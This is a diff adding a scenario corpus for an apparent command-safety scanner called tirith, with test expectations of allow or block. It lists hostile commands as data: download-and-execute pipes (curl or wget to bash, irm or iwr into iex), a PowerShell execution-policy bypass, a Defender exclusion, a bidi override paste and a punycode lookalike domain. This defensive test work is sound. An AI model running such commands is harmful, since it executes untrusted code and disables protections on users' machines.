@@ -1,0 +1,119 @@
+# Tirith lab corpus — curated adversarial scenarios that double as fixtures.
+#
+# This file is consumed by two places:
+#   1. `tirith lab` (crates/tirith/src/cli/lab.rs) — embedded via include_str!
+#      and run as the adversarial training surface.
+#   2. `test_lab_corpus_reaches_tier3` in crates/tirith-core/tests/golden_fixtures.rs
+#      — every non-allow scenario must produce at least one finding so corpus
+#      expansion cannot silently lose detection coverage.
+#
+# Schema:
+#   name             — unique scenario id (snake_case).
+#   description      — one-sentence explanation shown in interactive mode.
+#   input            — the raw command / paste string.
+#   context          — "exec" or "paste".
+#   shell            — "posix" (default) or "powershell".
+#   expected_action  — "allow" | "warn" | "block" (the action that engine::analyze must return).
+#   tags             — array of tag strings used by --filter.
+#   raw_bytes        — optional u8 array; if present, used as paste bytes verbatim
+#                      (overrides input.as_bytes()). Required for scenarios whose
+#                      input contains characters that don't survive TOML string
+#                      escaping cleanly (e.g. bidi controls).
+#
+# Adding a scenario:
+#   1. Pick a tag from the existing taxonomy where possible.
+#   2. Verify the scenario actually triggers the expected_action by running
+#      `cargo test --workspace --test golden_fixtures test_lab_corpus_reaches_tier3`.
+#   3. Keep `description` to a single declarative sentence.
+
+[[scenario]]
+name = "ps_set_execution_policy_bypass"
+description = "Disabling PowerShell script signing enforcement — common malware install step"
+input = "Set-ExecutionPolicy Bypass -Scope Process -Force"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "defense-evasion"]
+
+[[scenario]]
+name = "ps_defender_exclusion"
+description = "Adding a Defender exclusion path — hides malware from Windows Defender scans"
+input = "Add-MpPreference -ExclusionPath C:\\Users\\user\\AppData"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "defense-evasion"]
+
+[[scenario]]
+name = "ps_iex_inline_download"
+description = "Inline download-execute: fetches and runs a remote script in one expression"
+input = "iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "download-execute"]
+
+[[scenario]]
+name = "ps_irm_pipe_iex"
+description = "Pipe download-execute: Invoke-RestMethod result piped to Invoke-Expression"
+input = "irm https://example-cli.dev/get.ps1 | iex"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+tags = ["powershell", "download-execute"]
+
+[[scenario]]
+name = "curl_pipe_bash"
+description = "Classic install-script pattern: curl piped to bash"
+input = "curl https://example-cli.dev/install.sh | bash"
+context = "exec"
+expected_action = "block"
+tags = ["posix", "pipe-to-shell"]
+
+[[scenario]]
+name = "wget_pipe_sudo_bash"
+description = "Privileged install: wget piped to sudo bash"
+input = "wget -qO- https://example-cli.dev/install.sh | sudo bash"
+context = "exec"
+expected_action = "block"
+tags = ["posix", "pipe-to-shell"]
+
+[[scenario]]
+name = "bidi_rtl_override_paste"
+description = "Right-to-left override character hides true command intent"
+input = "normal  text"
+context = "paste"
+expected_action = "block"
+tags = ["terminal-injection", "bidi"]
+# Bytes: "normal " + U+202E (RTL OVERRIDE, encoded as E2 80 AE) + " text"
+raw_bytes = [110, 111, 114, 109, 97, 108, 32, 226, 128, 174, 32, 116, 101, 120, 116]
+
+[[scenario]]
+name = "punycode_homograph"
+description = "Punycode domain that looks like a trusted hostname"
+input = "curl https://xn--githb-0ra.com/repo/install.sh | bash"
+context = "exec"
+expected_action = "block"
+tags = ["hostname", "homograph"]
+
+[[scenario]]
+name = "ps_set_execution_policy_restricted_allow"
+description = "Restricting execution policy is safe — this is the secure direction"
+input = "Set-ExecutionPolicy Restricted"
+context = "exec"
+shell = "powershell"
+expected_action = "allow"
+tags = ["powershell", "allow"]
+
+[[scenario]]
+name = "curl_https_plain_install_allow"
+description = "Plain HTTPS install from a well-formed URL with no pipe-to-shell"
+# Uses .com rather than .dev to avoid the lookalike_tld MEDIUM warn that .dev
+# triggers — the intent of this scenario is "benign plain HTTPS curl -o", not
+# "exercise the lookalike_tld rule". The other example-cli.dev scenarios in
+# this file expect block, so the .dev warn is absorbed by the higher-severity
+# block finding and the scenario still reaches expected_action.
+input = "curl -o installer.sh https://example-cli.com/install.sh"
+context = "exec"
+expected_action = "allow"
+tags = ["posix", "allow"]
